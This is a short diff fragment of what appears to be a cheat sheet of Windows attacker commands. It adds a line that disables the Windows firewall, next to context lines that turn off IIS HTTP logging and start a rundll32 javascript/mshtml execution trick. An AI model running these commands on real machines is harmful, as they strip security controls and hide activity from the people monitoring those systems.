@@ -242,6 +242,11 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObj
  C:\Windows\System32\inetsrv\appcmd.exe set config "Default Web Site" /section:httpLogging /dontLog:true
 
 
+ **************
+
+ netsh advfirewall set currentprofile state off
+
+
 
 
 
